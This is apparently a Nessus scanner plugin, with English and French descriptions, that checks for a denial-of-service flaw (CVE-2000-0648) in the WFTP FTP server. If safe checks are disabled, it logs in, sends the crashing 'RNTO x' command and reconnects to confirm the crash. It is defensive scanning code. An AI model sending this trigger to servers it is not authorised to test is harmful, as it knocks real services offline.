#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10466);
 script_bugtraq_id(1456);
script_cve_id("CVE-2000-0648");
 script_version ("$Revision: 1.20 $");
 
 name["english"] = "WFTP RNTO DoS";
 name["francais"] = "Déni de service WFTP par la commande RNTO";
 
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The remote FTP server crashes when the command
'RNTO x' is issued right after the login.

An attacker may use this flaw to prevent you
from publishing anything using FTP.

Solution : if you are using wftp, then upgrade to
version 2.41 RC11, if you are not, then contact
your vendor for a fix.

Risk factor : High";
 


 desc["francais"] = "
Le serveur FTP distant plante lorsque la commande
'RNTO x' est donnée après la séquence de login.

Un pirate peut utiliser ce problème pour vous empecher
de publier quoi que ce soit par ftp.

Solution; si vous utilisez wftp, alors mettez-le à jour
en version 2.41 RC11. Sinon, contactez le vendeur et
informez-le de cette vulnérabilité.

Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote ftp server";
 summary["francais"] = "Plante le serveur ftp distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_MIXED_ATTACK); # mixed
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "FTP";
 family["francais"] = "FTP";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "ftp_anonymous.nasl");
 script_require_ports("Services/ftp", 21);
 script_require_keys("ftp/login");
 exit(0);
}

#
# The script code starts here
#
include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(!get_port_state(port)) exit(0);

if(safe_checks())
{
 banner = get_ftp_banner(port: port);
 if("WFTP" >< banner)
 {
 desc = "
You are running WFTP. One version of this
server crashes when the command
'RNTO x' is issued right after the login.

An attacker may use this flaw to prevent you
from publishing anything using FTP.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution : Make sure you are running WFTP 2.41 RC11
or newer 

Risk factor : High";
 security_hole(port:port, data:desc);
 }
 exit(0);
}


 login = get_kb_item("ftp/login");
 pass  = get_kb_item("ftp/password");
 soc = open_sock_tcp(port);
 if(soc)
 {
  if(login)
  {
  if(ftp_authenticate(socket:soc, user:login, pass:pass))
   {
    req = string("RNTO x\r\n");
    send(socket:soc, data:req);
    ftp_close(socket:soc);
    soc2 = open_sock_tcp(port);
    if ( ! soc2 ) exit(0);
    r = ftp_recv_line(socket:soc2);
    ftp_close(socket: soc2);
    if(!r)security_hole(port);
    exit(0);
   }
  else
    {
     close(soc);
     soc = open_sock_tcp(port);
     if (! soc ) exit(0);
    }   
  }
  
  r = ftp_recv_line(socket:soc);
  ftp_close(socket: soc);
  if("WFTPD 2.4 service" >< r)
  {
   data = string(
  "The remote FTP server *may* be vulnerable to a denial of\n",
 "service attack, but we could not check for it, as we could not\n",
 "log into this server.\n",
 "Make sure you are running WFTPd 2.41 RC11 or an attacker with a login\n",
 "and a password may shut down this server\n",
 "Risk factor : High");
  security_hole(port:port, data:data);
  }
 }

